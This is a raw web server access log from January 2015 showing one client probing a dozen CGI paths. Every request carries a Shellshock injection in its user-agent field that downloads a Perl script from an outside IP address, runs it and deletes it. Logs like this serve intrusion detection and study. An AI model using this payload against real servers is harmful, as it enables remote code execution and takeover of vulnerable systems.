76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/main.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/meme.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/php HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/php4 HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/php5 HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/php5-cli HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/recent.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/sat-ir-web.pl HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/test-cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/test.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/test-cgi.pl HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
